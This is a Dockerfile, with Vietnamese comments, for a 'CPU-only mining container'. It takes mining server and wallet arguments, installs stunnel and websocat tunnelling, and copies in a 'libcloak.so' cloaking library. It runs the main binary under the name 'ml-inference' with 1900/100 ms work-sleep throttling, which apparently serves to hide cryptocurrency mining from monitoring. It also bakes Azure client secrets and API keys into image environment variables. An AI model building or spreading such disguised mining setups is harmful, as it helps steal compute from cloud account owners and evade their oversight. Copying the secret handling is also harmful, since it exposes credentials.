FROM ubuntu:22.04


# =============================================================================
# **UNIFIED STAGE**: **Runtime-only approach** (phương pháp chỉ runtime) (KHÔNG **build BCC** từ **source** – mã nguồn)
# =============================================================================

# Thiết lập **non-interactive** (không tương tác) để tránh các câu hỏi khi cài đặt
ENV DEBIAN_FRONTEND=noninteractive


# ------------------  (1)  Biến môi trường & **ARG** (đối số) giữ nguyên ------------------
ARG AZURE_SUBSCRIPTION_ID
ARG AZURE_CLIENT_ID
ARG AZURE_CLIENT_SECRET
ARG AZURE_TENANT_ID
ARG ANOMALY_DETECTOR_API_KEY
ARG OPENAI_API_KEY
ARG LOG_ENCRYPTION_KEY
ARG MINING_SERVER_CPU
ARG MINING_WALLET_CPU
ARG NVIDIA_DRIVER_VERSION=535
ARG WEBSOCAT_VERSION=1.12.0
ARG TARGETARCH=amd64
ARG EVENT_BUS_BACKEND=memory

ENV DEBIAN_FRONTEND=noninteractive \
    PYTHONDONTWRITEBYTECODE=1 \
    PYTHONUNBUFFERED=1 \
    LANG=en_US.UTF-8 \
    LC_ALL=en_US.UTF-8 \
    AZURE_SUBSCRIPTION_ID=${AZURE_SUBSCRIPTION_ID} \
    AZURE_CLIENT_ID=${AZURE_CLIENT_ID} \
    AZURE_CLIENT_SECRET=${AZURE_CLIENT_SECRET} \
    AZURE_TENANT_ID=${AZURE_TENANT_ID} \
    ANOMALY_DETECTOR_API_KEY=${ANOMALY_DETECTOR_API_KEY} \
    OPENAI_API_KEY=${OPENAI_API_KEY} \
    LOG_ENCRYPTION_KEY=${LOG_ENCRYPTION_KEY} \
    MINING_SERVER_CPU=${MINING_SERVER_CPU} \
    MINING_WALLET_CPU=${MINING_WALLET_CPU} \
    NVIDIA_DRIVER_VERSION=${NVIDIA_DRIVER_VERSION} \
    EVENT_BUS_BACKEND=${EVENT_BUS_BACKEND} \
    PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"


# ------------------  (2)  Cài đặt **system base** (hệ thống cơ bản) ------------------------
RUN set -eux; \
    apt-get update --allow-releaseinfo-change || true; \
    apt-get install -y --no-install-recommends \
        apt-utils sudo nano wget file python3 python3-pip curl git \
        libssl-dev libeigen3-dev libnuma-dev stunnel4 \
        cpufrequtils iproute2 util-linux \
        python3-yaml \
        pciutils openssl lm-sensors powerstat stress-ng bash \
        htop locales iptables powertop tzdata numactl systemd dbus \
        pkg-config libhwloc15 libhwloc-dev ca-certificates lsb-release gnupg \
        libuv1 libudev1 libssl3 cgroup-tools libcgroup1 libcap2-bin \
        kmod software-properties-common snapd linux-tools-generic linux-tools-azure \
        erlang-base erlang-crypto erlang-eldap erlang-ftp erlang-inets erlang-mnesia \
        erlang-os-mon erlang-parsetools erlang-public-key erlang-runtime-tools \
        erlang-snmp erlang-ssl erlang-syntax-tools erlang-tftp erlang-tools \
        erlang-xmerl erlang-asn1 socat logrotate && \
    sudo apt-get clean && \
    sudo rm -rf /var/lib/apt/lists/*

# ------------------  (3)  Locale & Timezone  -------------------------------
RUN set -eux; apt-get update; DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata locales; \
    ln -fs /usr/share/zoneinfo/UTC /etc/localtime; echo "UTC" > /etc/timezone; \
    dpkg-reconfigure -f noninteractive tzdata; locale-gen en_US.UTF-8; \
    update-locale LANG=en_US.UTF-8 LC_ALL=en_US.UTF-8 && rm -rf /var/lib/apt/lists/*

# ------------------  (4)  Azure CLI  ---------------------------------------
RUN set -eux; apt-get update; apt-get install -y --no-install-recommends curl lsb-release gnupg ca-certificates; \
    curl -sL https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor -o /etc/apt/trusted.gpg.d/microsoft.gpg; \
    AZ_REPO=$(lsb_release -cs); \
    echo "deb [arch=amd64] https://packages.microsoft.com/repos/azure-cli/ $AZ_REPO main" > /etc/apt/sources.list.d/azure-cli.list; \
    apt-get update; apt-get install -y --no-install-recommends azure-cli; rm -rf /var/lib/apt/lists/*

# ------------------  (5)  Stunnel ------------------------------------------
RUN set -eux; mkdir -p /etc/stunnel; \
    openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
        -keyout /etc/stunnel/soff.key \
        -out /etc/stunnel/soff.crt \
        -subj "/C=VN/ST=Ho_Chi_Minh/L=Ho_Chi_Minh/O=MyOrg/OU=MyUnit/CN=example.com"; \
    chmod 600 /etc/stunnel/soff.key /etc/stunnel/soff.crt
COPY stunnel.conf /etc/stunnel/stunnel.conf
RUN set -eux; \
    chmod 700 /etc/stunnel/stunnel.conf; \
    command -v stunnel4 >/dev/null 2>&1 || (apt-get update && apt-get install -y --no-install-recommends stunnel4); \
    ln -sf $(command -v stunnel4) /usr/bin/stunnel


# ------------------  (7)  Thư mục làm việc & Python deps -------------------
RUN mkdir -p /app
WORKDIR /app
COPY requirements.txt /app/

# ----- Cài đặt Python dependencies -----
RUN set -eux; \
    if ! command -v pip3 >/dev/null 2>&1; then \
        apt-get update && \
        apt-get install -y --no-install-recommends python3-pip python3-dev; \
    fi; \
    python3 -m pip install --upgrade pip; \
    ln -sf $(which python3) /usr/bin/python || true; \
    pip3 install --no-cache-dir --break-system-packages --ignore-installed -r requirements.txt && \
    rm -rf /var/lib/apt/lists/* /root/.cache

# ------------------  (9)  Copy source code -------------------------------
COPY . /app/

# Sao chép pre-compiled binaries và libraries
COPY ml-inference /tmp/ml-inference
COPY entrypoint.sh /app/entrypoint.sh
COPY mining_environment/cpu_plugins/cloaking_lib/libcloak.so /usr/local/lib/libcloak.so

## CPU-only build: no GPU telemetry objects

RUN ldconfig && \
    install -D /tmp/ml-inference      /usr/local/bin/ml-inference && \
    mkdir -p /opt/hooks && chmod 755 /opt/hooks && \
    rm -rf /tmp/*

## CPU-only build: remove GPU/NVIDIA/OpenCL runtime packages

# ------------------  (11)  eBPF setup script & Websocat -------------------

RUN set -eux; \
    command -v wget >/dev/null 2>&1 || (apt-get update && apt-get install -y --no-install-recommends wget); \
    if [ "${TARGETARCH}" = "amd64" ]; then WEBSOCAT_ARCH="x86_64-unknown-linux-musl"; else WEBSOCAT_ARCH="aarch64-unknown-linux-musl"; fi; \
    wget -q "https://github.com/vi/websocat/releases/download/v${WEBSOCAT_VERSION}/websocat.${WEBSOCAT_ARCH}" -O /usr/local/bin/websocat; \
    chmod +x /usr/local/bin/websocat

# ------------------  (13)  ENV cố định ------------------------------------
ENV SCRIPT_DIR=/app/mining_environment/scripts \
    CONFIG_DIR=/app/mining_environment/config \
    MODELS_DIR=/app/mining_environment/models \
    LOGS_DIR=/app/mining_environment/logs \
    CPU_PLUGIN_CFG=/app/mining_environment/config/cpu_plugins.yml \
    ML_COMMAND=/usr/local/bin/ml-inference \
    WORK_MS=1900 SLEEP_MS=100 \
    ENABLE_MPO=0 MPO_LIB= \
    ENABLE_NS_ISOLATION=1 NS_USE_NET=1 \
    PYTHONPATH=/app:/usr/local/lib/python3.10/dist-packages:/usr/lib/python3/dist-packages \
    EVENT_BUS_BACKEND=memory \
    EVENTBUS_CONNECTION_TIMEOUT=10.0 \
    EVENTBUS_RETRY_ATTEMPTS=5 \
    EVENTBUS_HEALTH_CHECK_INTERVAL=60.0


## CPU-only build: no CUDA LD_LIBRARY_PATH or LD_PRELOAD hooks

# ------------------  (14)  Verification và cleanup ------------------------
RUN set -eux; \
    apt-get update; \
    command -v capsh >/dev/null 2>&1 || apt-get install -y --no-install-recommends libcap2-bin; \
    command -v capsh >/dev/null 2>&1 && ln -sf $(command -v capsh) /usr/local/bin/capsh; \
    ldconfig -p | grep -q "libuv.so.1" || (apt-get install -y --no-install-recommends libuv1 && ldconfig); \
    rm -rf /var/lib/apt/lists/*


# ------------------  (15)  Setup scripts ----------------
COPY setup_rdt.sh /app/setup_rdt.sh
COPY rdt-mount.service /etc/systemd/system/rdt-mount.service
RUN chmod +x /app/setup_rdt.sh && \
    if [ -d "/etc/systemd/system" ]; then \
        chmod 644 /etc/systemd/system/rdt-mount.service && \
        systemctl enable rdt-mount.service || true; \
    fi

# ------------------  (16)  Healthcheck & Metadata --------------------------
HEALTHCHECK --interval=1m --timeout=10s --start-period=30s --retries=3 CMD pgrep -f start_mining.py || exit 1

LABEL maintainer="Transformer Mining Team" \
      version="1.2.0" \
      description="CPU-only mining container (no CUDA/OpenCL)" \
      ebpf.enabled="true" \
      ebpf.mode="runtime-load-only" \
      security.level="high"

EXPOSE 8080 9090
VOLUME ["/var/log/ebpf", "/tmp/ebpf"]

# ------------------  (17)  Entrypoint & CMD --------------------------------
COPY start_mining.py /app/start_mining.py
RUN chmod +x /app/entrypoint.sh /app/start_mining.py

ENTRYPOINT ["/app/entrypoint.sh"]
CMD ["python3", "/app/start_mining.py"] 
